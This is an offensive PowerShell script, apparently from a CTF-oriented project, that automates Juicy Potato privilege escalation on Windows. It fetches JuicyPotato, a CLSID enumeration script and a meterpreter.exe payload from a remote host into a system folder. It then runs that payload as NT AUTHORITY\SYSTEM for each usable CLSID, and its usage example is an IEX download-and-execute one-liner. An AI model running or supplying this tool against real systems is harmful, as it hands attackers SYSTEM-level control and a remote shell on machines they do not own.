function Invoke-LovelyPotato
{
<#
.SYNOPSIS
Powershell script which automates the process of Juicy Potato local privilege escalation.

.DESCRIPTION
This script involves three major steps:
1. Downloads Juicy Potato static binary, CLSID enumeration script and an arbitrary binary which to be ran as NT AUTHORITY\SYSTEM.
2. Runs CLSID enumeration script in the background.
3. Launches Juicy Potato exploit for every CLSID with NT AUTHORITY\SYSTEM privilege found.

.EXAMPLE
PS > IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-LovelyPotato.ps1')

.NOTES
You must first read README.md and follow the instruction for initial setup or else this script will fail.

.LINK
https://github.com/TsukiCTF/Lovely-Potato
#>
	# Configuration
	$RemoteDir = "http://10.10.10.10"
	$LocalPath = "c:\windows\system32\spool\drivers\color"

	# Download necessary files for exploitation
	(New-Object Net.WebClient).DownloadFile("$RemoteDir/JuicyPotato-Static.exe", "$LocalPath\juicypotato.exe")
	(New-Object Net.WebClient).DownloadFile("$RemoteDir/test_clsid.bat", "$LocalPath\test_clsid.bat")
	(New-Object Net.WebClient).DownloadFile("$RemoteDir/meterpreter.exe", "$LocalPath\meterpreter.exe")

	# Enumerate CLSIDs
	New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT
	$CLSID = Get-ItemProperty HKCR:\clsid\* | Select-Object AppID,@{N='CLSID'; E={$_.pschildname}} | Where-Object {$_.appid -ne $null}
	$CLSID | Select-Object CLSID -ExpandProperty CLSID | Out-File -FilePath "$LocalPath\CLSID.list" -Encoding ascii
	Start-Process -FilePath "cmd" -ArgumentList "/c $LocalPath\test_clsid.bat" -WorkingDirectory $LocalPath

	# Find System CLSIDs
	Start-Sleep -s 300
	$SystemCLSID = type $LocalPath\result.log | findstr /i "system" | ForEach-Object {echo $_.split(";")[0]}

	# Launch Juicy Potato
	$SystemCLSID | ForEach-Object {cmd /c "$LocalPath\juicypotato.exe -t * -p $LocalPath\meterpreter.exe -l 10001 -c $_"}
}

Invoke-LovelyPotato

